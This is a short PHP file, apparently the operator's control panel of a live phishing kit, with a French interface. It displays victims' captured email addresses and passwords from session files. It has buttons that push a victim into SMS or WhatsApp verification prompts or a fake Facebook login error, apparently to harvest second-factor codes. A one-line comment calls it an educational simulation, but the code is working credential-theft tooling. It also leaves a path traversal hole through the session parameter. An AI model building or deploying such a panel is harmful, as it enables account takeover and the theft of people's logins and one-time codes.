<?php
// ⚠️ This is a phishing simulation for educational awareness only.
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
if (empty($sessionId) || empty($clientIp)) die("Paramètres manquants");

$clientData = [];
$filename = "sessions/$sessionId.json";
if (file_exists($filename)) {
    $clientData = json_decode(file_get_contents($filename), true);
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>REMOTE - Control Panel</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>body{font-family:Segoe UI;background:#f0f2f5}.container{max-width:600px;margin:20px auto;background:white;padding:20px;border-radius:8px}button{margin:10px;padding:10px 20px;border:none;border-radius:6px;cursor:pointer}</style>
</head>
<body>
    <div class="container">
        <h1>🎮 Control Panel</h1>
        <p><strong>Session:</strong> <?= htmlspecialchars($sessionId) ?></p>
        <p><strong>IP:</strong> <?= htmlspecialchars($clientIp) ?></p>
        <?php if (!empty($clientData)): ?>
            <p><strong>Email:</strong> <?= htmlspecialchars($clientData['email']) ?></p>
            <p><strong>Password:</strong> <?= htmlspecialchars($clientData['password']) ?></p>
        <?php endif; ?>
        <form action="save_action.php" method="post">
            <input type="hidden" name="session" value="<?= $sessionId ?>">
            <input type="hidden" name="ip" value="<?= $clientIp ?>">
            <button name="action" value="sms_verification">📱 Demander SMS</button>
            <button name="action" value="whatsapp_verification">💬 Demander WhatsApp</button>
            <button name="action" value="facebook_error">❌ Erreur login</button>
        </form>
    </div>
</body>
</html>
